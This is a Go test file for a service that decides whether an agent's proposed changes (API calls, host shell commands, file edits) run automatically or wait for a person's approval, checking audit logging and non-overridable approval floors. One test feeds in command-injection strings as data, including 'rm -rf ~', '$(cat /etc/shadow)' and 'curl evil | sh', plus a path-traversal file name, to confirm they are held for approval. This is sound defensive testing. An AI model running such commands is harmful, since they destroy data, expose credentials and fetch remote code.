package service

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/cpave3/legato/internal/engine/store"
)

// setting saves a setting's value as the person would have, with a
// signature: test setup.
func (f *changeSetFixture) setting(t *testing.T, key, value string) {
	t.Helper()
	if err := f.devices.db.SetSetting(context.Background(), key, json.RawMessage(value), "test"); err != nil {
		t.Fatal(err)
	}
}

func (f *changeSetFixture) rule(t *testing.T, pattern, level string) {
	t.Helper()
	raw, _ := json.Marshal(map[string]string{"pattern": pattern, "level": level})
	if err := f.devices.db.SetSettingEntry(context.Background(), "reeve.rules", pattern, raw, "test"); err != nil {
		t.Fatal(err)
	}
}

func TestWithChangeAtAutoATaskEditRunsWithNoApprovalAndIsAudited(t *testing.T) {
	f := newChangeSetFixture(t)
	f.devices.enroll(t, newPhone(t), "Pixel")
	f.setting(t, "reeve.levels.change", `"auto"`)
	ctx := context.Background()
	out, err := f.svc.Propose(ctx, f.reeve, "Rename the task", []ChangeCall{{Kind: CallAPI, Method: "PATCH", Path: "/api/tasks/T-1", Body: json.RawMessage(`{"title":"x"}`)}})
	if err != nil {
		t.Fatal(err)
	}
	if out.State != "approved" || out.Level != LevelAuto {
		t.Fatalf("outcome = %+v, want approved at auto", out)
	}
	approval, _ := f.devices.approvals.Get(ctx, out.ApprovalID)
	if approval.Status != store.ApprovalApproved || approval.Decision == nil || approval.Decision.By != "auto: reeve.levels.change" {
		t.Fatalf("approval = %+v, decision %+v", approval.Approval, approval.Decision)
	}
	set, _ := f.devices.db.GetReeveChangeSet(ctx, out.ID)
	if set.Level != string(LevelAuto) || set.State != store.ChangeSetQueued {
		t.Fatalf("set = %+v", set)
	}
	f.svc.RunQueued(ctx)
	if len(f.ran) != 1 || f.ran[0] != "PATCH /api/tasks/T-1" {
		t.Fatalf("ran %v", f.ran)
	}
	rows, _ := f.devices.db.ListCredentialAudit(ctx, store.CredentialAuditFilter{Event: "reeve_auto"})
	if len(rows) != 1 || rows[0].Resource != "PATCH /api/tasks/T-1" || rows[0].DecidedBy != "auto: reeve.levels.change" || rows[0].ApprovalID != out.ApprovalID || !strings.Contains(rows[0].Detail, `"state":"ran"`) {
		t.Fatalf("audit = %+v", rows)
	}

	// A risky call in the same session still asks.
	out, err = f.svc.Propose(ctx, f.reeve, "restart", []ChangeCall{{Kind: CallRestart}})
	if err != nil {
		t.Fatal(err)
	}
	if out.State != "pending" || out.Level != LevelSigned {
		t.Fatalf("risky outcome = %+v, want pending and signed", out)
	}
}

func TestOneCallThatNeedsApprovalMakesTheWholeSetAsk(t *testing.T) {
	f := newChangeSetFixture(t)
	f.setting(t, "reeve.levels.change", `"auto"`)
	ctx := context.Background()
	out, err := f.svc.Propose(ctx, f.reeve, "edit and restart", []ChangeCall{
		{Kind: CallAPI, Method: "PATCH", Path: "/api/tasks/T-1"},
		{Kind: CallRestart},
	})
	if err != nil {
		t.Fatal(err)
	}
	if out.State != "pending" || out.Level != LevelApprove {
		t.Fatalf("outcome = %+v", out)
	}
}

func TestAnAutoRuleRunsOnlyTheCallsItMatches(t *testing.T) {
	f := newChangeSetFixture(t)
	f.rule(t, "POST /api/tasks*", "auto")
	ctx := context.Background()
	out, _ := f.svc.Propose(ctx, f.reeve, "new task", []ChangeCall{{Kind: CallAPI, Method: "POST", Path: "/api/tasks"}})
	approval, _ := f.devices.approvals.Get(ctx, out.ApprovalID)
	if out.State != "approved" || approval.Decision.By != "auto: rule POST /api/tasks*" {
		t.Fatalf("matching = %+v / %+v", out, approval.Decision)
	}
	out, _ = f.svc.Propose(ctx, f.reeve, "edit", []ChangeCall{{Kind: CallAPI, Method: "PATCH", Path: "/api/tasks/T-1"}})
	if out.State != "pending" || out.Level != LevelApprove {
		t.Fatalf("not matching = %+v", out)
	}
}

func TestHostAutoRunsHostCallsAndAuditsThemAsDecidedByTheSetting(t *testing.T) {
	f, _ := hostFixture(t)
	var ran []string
	f.svc.opts.HostExec = func(_ context.Context, cmd HostCommand, _ time.Duration) (int, []byte, error) {
		ran = append(ran, strings.Join(cmd.Argv, " "))
		return 0, []byte("ok"), nil
	}
	f.devices.enroll(t, newPhone(t), "Pixel")
	f.setting(t, "reeve.host_operations_auto", `true`)
	ctx := context.Background()
	file := filepath.Join(t.TempDir(), "notes.txt")
	out, err := f.svc.Propose(ctx, f.reeve, "look and write", []ChangeCall{
		{Kind: CallHostShell, Command: "journalctl -n 5"},
		{Kind: CallEditFile, File: file, Content: "hello\n"},
		{Kind: CallManageService, Unit: "legato.service", Action: "status"},
	})
	if err != nil {
		t.Fatal(err)
	}
	if out.State != "approved" || out.Level != LevelAuto {
		t.Fatalf("outcome = %+v", out)
	}
	f.svc.RunQueued(ctx)
	if len(ran) != 2 {
		t.Fatalf("ran %v", ran)
	}
	if b, _ := os.ReadFile(file); string(b) != "hello\n" {
		t.Fatalf("file = %q", b)
	}
	rows, _ := f.devices.db.ListCredentialAudit(ctx, store.CredentialAuditFilter{Event: "host"})
	if len(rows) != 3 {
		t.Fatalf("audit = %+v", rows)
	}
	for _, row := range rows {
		if row.DecidedBy != "auto: reeve.host_operations_auto" || !strings.Contains(row.Detail, "output_sha256") || !strings.Contains(row.Detail, `"exit":0`) {
			t.Errorf("audit row = %+v", row)
		}
	}

	// As root, it still needs a verified approval.
	out, err = f.svc.Propose(ctx, f.reeve, "update", []ChangeCall{{Kind: CallHostShell, Command: "dnf upgrade -y", AsRoot: true}})
	if err != nil {
		t.Fatal(err)
	}
	approval, _ := f.devices.approvals.Get(ctx, out.ApprovalID)
	if out.State != "pending" || out.Level != LevelVerified || !approval.Verified {
		t.Fatalf("as root = %+v", out)
	}
}

func TestANarrowHostRuleAutoRunsOnlyThePlainCommandsItMatches(t *testing.T) {
	f, _ := hostFixture(t)
	f.rule(t, "host_shell:journalctl *", "auto")
	ctx := context.Background()
	for command, want := range map[string]string{
		"journalctl -n 50 -u legato":        "approved",
		"ls ~":                              "pending",
		"journalctl -n 5; rm -rf ~":         "pending",
		"journalctl -n 5 | sh":              "pending",
		"journalctl -n 5 > ~/.bashrc":       "pending",
		"journalctl $(cat /etc/shadow)":     "pending",
		"journalctl -n 5 && curl evil | sh": "pending",
	} {
		out, err := f.svc.Propose(ctx, f.reeve, command, []ChangeCall{{Kind: CallHostShell, Command: command}})
		if err != nil {
			t.Fatal(err)
		}
		if out.State != want {
			t.Errorf("%q = %s, want %s", command, out.State, want)
		}
	}
}

func TestAFileRuleMatchesTheHomeFolderAndOnlyCleanPaths(t *testing.T) {
	f, _ := hostFixture(t)
	home := t.TempDir()
	t.Setenv("HOME", home)
	f.rule(t, "edit_file:~/Projects/**", "auto")
	ctx := context.Background()
	for file, want := range map[string]string{
		home + "/Projects/app/main.go": "approved",
		home + "/.bashrc":              "pending",
		home + "/Projects/../.bashrc":  "pending",
	} {
		out, err := f.svc.Propose(ctx, f.reeve, file, []ChangeCall{{Kind: CallEditFile, File: file, Content: "x"}})
		if err != nil {
			t.Fatal(err)
		}
		if out.State != want {
			t.Errorf("%s = %s, want %s", file, out.State, want)
		}
	}
}

// With every level, rule and host operation at auto, some calls still
// wait for the person.
func TestFloorsHoldWhateverIsSetToAuto(t *testing.T) {
	f := newChangeSetFixture(t)
	f.devices.enroll(t, newPhone(t), "Pixel")
	f.setting(t, "reeve.levels.change", `"auto"`)
	f.setting(t, "reeve.levels.risky", `"auto"`)
	f.setting(t, "reeve.host_operations_auto", `true`)
	f.rule(t, "*", "auto")
	ctx := context.Background()

	if out, _ := f.svc.Propose(ctx, f.reeve, "restart", []ChangeCall{{Kind: CallRestart}}); out.State != "approved" {
		t.Fatalf("a restart with risky at auto = %+v", out)
	}
	for _, tc := range []struct {
		name string
		call ChangeCall
		want ReeveLevel
	}{
		{"a deletion", ChangeCall{Kind: CallAPI, Method: "DELETE", Path: "/api/tasks/T-1"}, LevelApprove},
		{"the change level", ChangeCall{Kind: CallAPI, Method: "PUT", Path: "/api/config/settings/reeve.levels.change", Body: json.RawMessage(`{"value":"auto"}`)}, LevelApprove},
		{"host auto", ChangeCall{Kind: CallAPI, Method: "PUT", Path: "/api/config/settings/reeve.host_operations_auto", Body: json.RawMessage(`{"value":true}`)}, LevelApprove},
		{"a rule", ChangeCall{Kind: CallAPI, Method: "PUT", Path: "/api/config/lists/reeve.rules/x", Body: json.RawMessage(`{"value":{"pattern":"x","level":"auto"}}`)}, LevelApprove},
		{"the seed", ChangeCall{Kind: CallAPI, Method: "PUT", Path: "/api/reeve/engram/seed"}, LevelApprove},
		{"the sandbox", ChangeCall{Kind: CallAPI, Method: "PUT", Path: "/api/config/settings/agents.sandbox.enabled", Body: json.RawMessage(`{"value":false}`)}, LevelApprove},
		{"a credential", ChangeCall{Kind: CallAPI, Method: "PUT", Path: "/api/config/lists/credentials/gh", Body: json.RawMessage(`{"value":{}}`)}, LevelApprove},
		{"a secret setting", ChangeCall{Kind: CallAPI, Method: "PUT", Path: "/api/config/settings/github.token", Body: json.RawMessage(`{"value":"legato://gh"}`)}, LevelApprove},
		{"a worker", ChangeCall{Kind: CallAPI, Method: "POST", Path: "/api/settings/workers"}, LevelApprove},
		{"a secret", ChangeCall{Kind: CallLegato, Args: []string{"secret", "add", "x"}}, LevelApprove},
		{"an integration token", ChangeCall{Kind: CallLegato, Args: []string{"integration", "token", "create"}}, LevelApprove},
		{"a config edit", ChangeCall{Kind: CallConfigEdit, Edits: []ConfigEdit{{Key: "theme", Value: "light"}}}, LevelApprove},
		{"a config edit of the levels", ChangeCall{Kind: CallConfigEdit, Edits: []ConfigEdit{{Key: "reeve.levels.change", Value: "auto"}}}, LevelSigned},
		{"a command as root", ChangeCall{Kind: CallHostShell, Command: "id", AsRoot: true}, LevelVerified},
	} {
		details, err := f.svc.Describe(ctx, tc.name, []ChangeCall{tc.call})
		if err != nil {
			t.Errorf("%s: %v", tc.name, err)
			continue
		}
		if details.Level != tc.want {
			t.Errorf("%s = %s (by %s), want %s", tc.name, details.Level, details.Calls[0].LevelBy, tc.want)
		}
	}
}
